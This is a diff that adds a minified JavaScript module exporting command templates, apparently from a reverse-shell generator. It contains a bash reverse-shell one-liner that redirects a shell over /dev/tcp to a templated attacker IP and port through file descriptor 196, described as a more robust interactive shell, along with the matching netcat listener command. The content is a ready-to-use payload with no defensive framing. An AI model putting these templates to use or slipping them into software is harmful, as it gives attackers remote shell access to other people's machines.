@@ -1,0 +1,1 @@
+const e=[{title:"bash 196 (file descriptor trick)",template:"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",description:"Uses a dedicated file descriptor (196) for a more robust interactive shell."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
